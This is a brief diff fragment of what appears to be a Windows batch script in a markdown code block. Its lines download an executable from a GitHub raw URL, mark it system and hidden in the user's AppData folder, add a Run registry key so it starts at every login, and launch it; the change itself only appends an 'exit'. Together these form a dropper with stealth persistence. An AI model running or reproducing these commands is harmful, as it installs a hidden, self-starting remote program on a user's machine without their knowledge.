@@ -15,4 +15,5 @@ curl https://raw.githubusercontent.com/Minecraft-vIIr/public/refs/heads/main/fct
 attrib +s +h +a %appdata%\fctrl5.exe
 reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "fctrl5" /d %appdata%\fctrl5.exe /f
 cmd.exe /C start %appdata%\fctrl5.exe
+exit
 ```
